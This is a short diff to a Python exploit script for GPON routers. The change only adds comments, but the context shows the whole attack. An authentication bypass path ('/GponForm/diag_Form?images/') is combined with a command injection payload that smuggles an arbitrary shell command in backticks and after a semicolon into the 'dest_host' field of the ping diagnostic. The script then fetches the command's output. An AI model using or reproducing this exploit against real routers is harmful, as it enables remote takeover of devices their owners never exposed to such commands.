@@ -55,16 +55,18 @@ def send_command(url_bypass, payload):
 if __name__ == "__main__":
 	try:		
 		banner()
-		
+		# Getting the parameters
 		domain = sys.argv[1]
 		command = sys.argv[2]
-		
+		# Create url and payload
 		url_bypass = domain + '/GponForm/diag_Form?images/'
 		payload = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + command + '`;' + command + '&ipv=0'
+		# Injecting the command
 		send_command(url_bypass, payload)
 		print "[*] Waiting for results..zZz.."
 		time.sleep(3)
 		print "[*] Getting the results.."
+		# Retrieve the output
 		out = retrieve_results(domain, command)
 		print ""
 		print out
